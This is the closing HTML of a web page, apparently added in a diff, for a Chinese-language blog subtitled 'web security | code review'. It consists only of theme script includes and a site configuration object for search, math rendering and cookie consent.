+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"typeit-header-subtitle-desktop":"web security | code review","typeit-header-subtitle-mobile":"web security | code review"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"highlightTag":"em","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50},"siteTime":"2022-12-21T16:00:00+08:00","twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-subtitle-desktop":["typeit-header-subtitle-desktop"],"typeit-header-subtitle-mobile":["typeit-header-subtitle-mobile"]},"duration":-1,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
